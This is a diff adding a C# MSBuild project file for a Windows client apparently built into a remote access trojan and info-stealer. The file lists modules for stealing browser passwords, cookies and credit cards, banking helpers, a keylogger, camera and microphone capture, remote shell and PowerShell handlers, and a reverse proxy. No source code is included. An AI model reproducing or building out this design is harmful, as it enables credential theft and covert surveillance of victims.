@@ -1,0 +1,240 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{3B85814F-A51D-4572-9325-947C9E8D217B}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <RootNamespace>Client</RootNamespace>
+    <AssemblyName>Client35</AssemblyName>
+    <TargetFrameworkVersion>v4.8</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <Deterministic>true</Deterministic>
+    <NuGetPackageImportStamp>
+    </NuGetPackageImportStamp>
+    <TargetFrameworkProfile>
+    </TargetFrameworkProfile>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>..\Binaries\Debug\Client\NET35\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+    <Prefer32Bit>false</Prefer32Bit>
+    <GenerateSerializationAssemblies>Off</GenerateSerializationAssemblies>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>none</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>..\Creeper\Resources\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+    <Prefer32Bit>false</Prefer32Bit>
+    <GenerateSerializationAssemblies>Off</GenerateSerializationAssemblies>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="Newtonsoft.Json, Version=6.0.0.0, Culture=neutral, PublicKeyToken=30ad4fe6b2a6aeed, processorArchitecture=MSIL">
+      <SpecificVersion>False</SpecificVersion>
+      <HintPath>DLL\Newtonsoft.Json.dll</HintPath>
+      <Private>False</Private>
+    </Reference>
+    <Reference Include="Shared, Version=1.0.0.0, Culture=neutral, processorArchitecture=MSIL">
+      <SpecificVersion>False</SpecificVersion>
+      <HintPath>DLL\Shared.dll</HintPath>
+      <Private>False</Private>
+    </Reference>
+    <Reference Include="System" />
+    <Reference Include="System.Configuration.Install" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Data.SQLite, Version=1.0.116.0, Culture=neutral, PublicKeyToken=db937bc2d44ff139, processorArchitecture=MSIL">
+      <SpecificVersion>False</SpecificVersion>
+      <HintPath>DLL\System.Data.SQLite.dll</HintPath>
+      <Private>False</Private>
+    </Reference>
+    <Reference Include="System.Management" />
+    <Reference Include="System.Security" />
+    <Reference Include="System.Security.Cryptography.ProtectedData, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Security.Cryptography.ProtectedData.6.0.0\lib\net461\System.Security.Cryptography.ProtectedData.dll</HintPath>
+    </Reference>
+    <Reference Include="System.ServiceProcess" />
+    <Reference Include="System.Xml.Linq" />
+    <Reference Include="System.Data.DataSetExtensions" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Deployment" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="Browsers\Browser.cs" />
+    <Compile Include="Browsers\BrowserUtils.cs" />
+    <Compile Include="Browsers\Chromium\AesGcm.cs" />
+    <Compile Include="Browsers\Chromium\AutoFill.cs" />
+    <Compile Include="Browsers\Chromium\BCrypt.cs" />
+    <Compile Include="Browsers\Chromium\Bookmarks.cs" />
+    <Compile Include="Browsers\Chromium\Chromium.cs" />
+    <Compile Include="Browsers\Chromium\Cookies.cs" />
+    <Compile Include="Browsers\Chromium\CreditCards.cs" />
+    <Compile Include="Browsers\Chromium\Downloads.cs" />
+    <Compile Include="Browsers\Chromium\History.cs" />
+    <Compile Include="Browsers\Chromium\Passwords.cs" />
+    <Compile Include="Browsers\config.cs" />
+    <Compile Include="Browsers\Edge\AutoFill.cs" />
+    <Compile Include="Browsers\Edge\Bookmarks.cs" />
+    <Compile Include="Browsers\Edge\CreditCards.cs" />
+    <Compile Include="Browsers\Edge\Edge.cs" />
+    <Compile Include="Browsers\Firefox\Bookmarks.cs" />
+    <Compile Include="Browsers\Firefox\Cookies.cs" />
+    <Compile Include="Browsers\Firefox\FFDecryptor.cs" />
+    <Compile Include="Browsers\Firefox\Firefox.cs" />
+    <Compile Include="Browsers\Firefox\History.cs" />
+    <Compile Include="Browsers\Firefox\Passwords.cs" />
+    <Compile Include="Browsers\Helpers\Banking.cs" />
+    <Compile Include="Browsers\Helpers\Common.cs" />
+    <Compile Include="Browsers\Helpers\Counter.cs" />
+    <Compile Include="Browsers\Helpers\Paths.cs" />
+    <Compile Include="Browsers\Helpers\SQLite.cs" />
+    <Compile Include="Browsers\Helpers\SqlReader.cs" />
+    <Compile Include="Browsers\Helpers\StringsCrypt.cs" />
+    <Compile Include="Browsers\Internet Explorer\InternetExplorer.cs" />
+    <Compile Include="Browsers\Internet Explorer\Passwords.cs" />
+    <Compile Include="Browsers\Internet Explorer\VaultCli.cs" />
+    <Compile Include="EmbeddedAssembly.cs" />
+    <Compile Include="HandlePacket\HandleThumbnail.cs" />
+    <Compile Include="Helper\AForge\Video.DirectShow\CameraControlProperty.cs" />
+    <Compile Include="Helper\AForge\Video.DirectShow\FilterInfo.cs" />
+    <Compile Include="Helper\AForge\Video.DirectShow\FilterInfoCollection.cs" />
+    <Compile Include="Helper\AForge\Video.DirectShow\Internals\IAMCameraControl.cs" />
+    <Compile Include="Helper\AForge\Video.DirectShow\Internals\IAMCrossbar.cs" />
+    <Compile Include="Helper\AForge\Video.DirectShow\Internals\IAMStreamConfig.cs" />
+    <Compile Include="Helper\AForge\Video.DirectShow\Internals\IAMVideoControl.cs" />
+    <Compile Include="Helper\AForge\Video.DirectShow\Internals\IBaseFilter.cs" />
+    <Compile Include="Helper\AForge\Video.DirectShow\Internals\ICaptureGraphBuilder2.cs" />
+    <Compile Include="Helper\AForge\Video.DirectShow\Internals\ICreateDevEnum.cs" />
+    <Compile Include="Helper\AForge\Video.DirectShow\Internals\IEnumFilters.cs" />
+    <Compile Include="Helper\AForge\Video.DirectShow\Internals\IEnumPins.cs" />
+    <Compile Include="Helper\AForge\Video.DirectShow\Internals\IFilterGraph.cs" />
+    <Compile Include="Helper\AForge\Video.DirectShow\Internals\IFilterGraph2.cs" />
+    <Compile Include="Helper\AForge\Video.DirectShow\Internals\IGraphBuilder.cs" />
+    <Compile Include="Helper\AForge\Video.DirectShow\Internals\IMediaControl.cs" />
+    <Compile Include="Helper\AForge\Video.DirectShow\Internals\IMediaEventEx.cs" />
+    <Compile Include="Helper\AForge\Video.DirectShow\Internals\IPin.cs" />
+    <Compile Include="Helper\AForge\Video.DirectShow\Internals\IPropertyBag.cs" />
+    <Compile Include="Helper\AForge\Video.DirectShow\Internals\IReferenceClock.cs" />
+    <Compile Include="Helper\AForge\Video.DirectShow\Internals\ISampleGrabber.cs" />
+    <Compile Include="Helper\AForge\Video.DirectShow\Internals\ISampleGrabberCB.cs" />
+    <Compile Include="Helper\AForge\Video.DirectShow\Internals\ISpecifyPropertyPages.cs" />
+    <Compile Include="Helper\AForge\Video.DirectShow\Internals\Structures.cs" />
+    <Compile Include="Helper\AForge\Video.DirectShow\Internals\Uuids.cs" />
+    <Compile Include="Helper\AForge\Video.DirectShow\Internals\Win32.cs" />
+    <Compile Include="Helper\AForge\Video.DirectShow\PhysicalConnectorType.cs" />
+    <Compile Include="Helper\AForge\Video.DirectShow\Uuids.cs" />
+    <Compile Include="Helper\AForge\Video.DirectShow\VideoCapabilities.cs" />
+    <Compile Include="Helper\AForge\Video.DirectShow\VideoCaptureDevice.cs" />
+    <Compile Include="Helper\AForge\Video.DirectShow\VideoInput.cs" />
+    <Compile Include="Helper\AForge\Video\IVideoSource.cs" />
+    <Compile Include="Helper\AForge\Video\VideoEvents.cs" />
+    <Compile Include="HandlePacket\HandleCamera.cs" />
+    <Compile Include="HandlePacket\HandleDesktop.cs" />
+    <Compile Include="HandlePacket\HandleDevice.cs" />
+    <Compile Include="HandlePacket\HandleKeylogger.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="HandlePacket\HandleNetwork.cs" />
+    <Compile Include="HandlePacket\HandleOption.cs" />
+    <Compile Include="HandlePacket\HandlePlugin.cs" />
+    <Compile Include="HandlePacket\HandleRegEdit.cs" />
+    <Compile Include="HandlePacket\HandleReverseProxy.cs" />
+    <Compile Include="HandlePacket\HandleShell.cs" />
+    <Compile Include="HandlePacket\HandleFile.cs" />
+    <Compile Include="HandlePacket\HandlePowershell.cs" />
+    <Compile Include="HandlePacket\HandleProcess.cs" />
+    <Compile Include="HandlePacket\HandleVoice.cs" />
+    <Compile Include="HandlePacket\Packet.cs" />
+    <Compile Include="Helper\Helper.cs" />
+    <Compile Include="Helper\RegManager\ByteConverter.cs" />
+    <Compile Include="Helper\RegManager\RegistryExtensions.cs" />
+    <Compile Include="Helper\RegManager\RegistryEditor.cs" />
+    <Compile Include="Helper\RegManager\RegistryKeyExtensions.cs" />
+    <Compile Include="Helper\RegManager\RegistryKeyHelper.cs" />
+    <Compile Include="Helper\RegManager\RegistrySeeker.cs" />
+    <Compile Include="Helper\Native.cs" />
+    <Compile Include="Helper\Service.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="Helper\Service.Designer.cs">
+      <DependentUpon>Service.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Helper\StreamLibrary\UnsafeCodecs\UnsafeOptimizedCodec.cs" />
+    <Compile Include="Program.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Helper\Reverse Proxy\ConnectionFactory.cs" />
+    <Compile Include="Helper\Reverse Proxy\ConnectionManager.cs" />
+    <Compile Include="Helper\Reverse Proxy\Serializer.cs" />
+    <Compile Include="Helper\Reverse Proxy\Socks5Data.cs" />
+    <Compile Include="Helper\Reverse Proxy\Socks5State.cs" />
+    <Compile Include="Helper\Reverse Proxy\Socks5Status.cs" />
+    <Compile Include="Helper\Reverse Proxy\Socks5TCPData.cs" />
+    <Compile Include="Helper\Reverse Proxy\Socks5UDPData.cs" />
+    <Compile Include="Helper\Reverse Proxy\UdpAssociate.cs" />
+    <Compile Include="Helper\StreamLibrary\Enums.cs" />
+    <Compile Include="Helper\StreamLibrary\IUnsafeCodec.cs" />
+    <Compile Include="Helper\StreamLibrary\IVideoCodec.cs" />
+    <Compile Include="Helper\StreamLibrary\src\JpgCompression.cs" />
+    <Compile Include="Helper\StreamLibrary\src\LzwCompression.cs" />
+    <Compile Include="Helper\StreamLibrary\src\NativeMethods.cs" />
+    <Compile Include="Helper\StreamLibrary\UnsafeCodecs\UnsafeStreamCodec.cs" />
+    <Compile Include="TCPSocket.cs" />
+    <Compile Include="Helper\WaveLib\Win32.cs" />
+    <Compile Include="Helper\WaveLib\WinSound.cs" />
+    <Compile Include="Helper\WaveLib\WinSoundRecord.cs" />
+    <EmbeddedResource Include="Properties\Resources.resx">
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <Compile Include="Properties\Resources.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Resources.resx</DependentUpon>
+      <DesignTime>True</DesignTime>
+    </Compile>
+    <None Include="app.config" />
+    <None Include="packages.config" />
+    <None Include="Properties\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>Settings.Designer.cs</LastGenOutput>
+    </None>
+    <Compile Include="Properties\Settings.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Settings.settings</DependentUpon>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="DLL\System.Data.SQLite.dll" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="DLL\Newtonsoft.Json.dll" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="DLL\Shared.dll" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+  <Import Project="..\packages\Stub.System.Data.SQLite.Core.NetFramework.1.0.116.0\build\net46\Stub.System.Data.SQLite.Core.NetFramework.targets" Condition="Exists('..\packages\Stub.System.Data.SQLite.Core.NetFramework.1.0.116.0\build\net46\Stub.System.Data.SQLite.Core.NetFramework.targets')" />
+  <Target Name="EnsureNuGetPackageBuildImports" BeforeTargets="PrepareForBuild">
+    <PropertyGroup>
+      <ErrorText>This project references NuGet package(s) that are missing on this computer. Use NuGet Package Restore to download them.  For more information, see http://go.microsoft.com/fwlink/?LinkID=322105. The missing file is {0}.</ErrorText>
+    </PropertyGroup>
+    <Error Condition="!Exists('..\packages\Stub.System.Data.SQLite.Core.NetFramework.1.0.116.0\build\net46\Stub.System.Data.SQLite.Core.NetFramework.targets')" Text="$([System.String]::Format('$(ErrorText)', '..\packages\Stub.System.Data.SQLite.Core.NetFramework.1.0.116.0\build\net46\Stub.System.Data.SQLite.Core.NetFramework.targets'))" />
+  </Target>
+</Project>
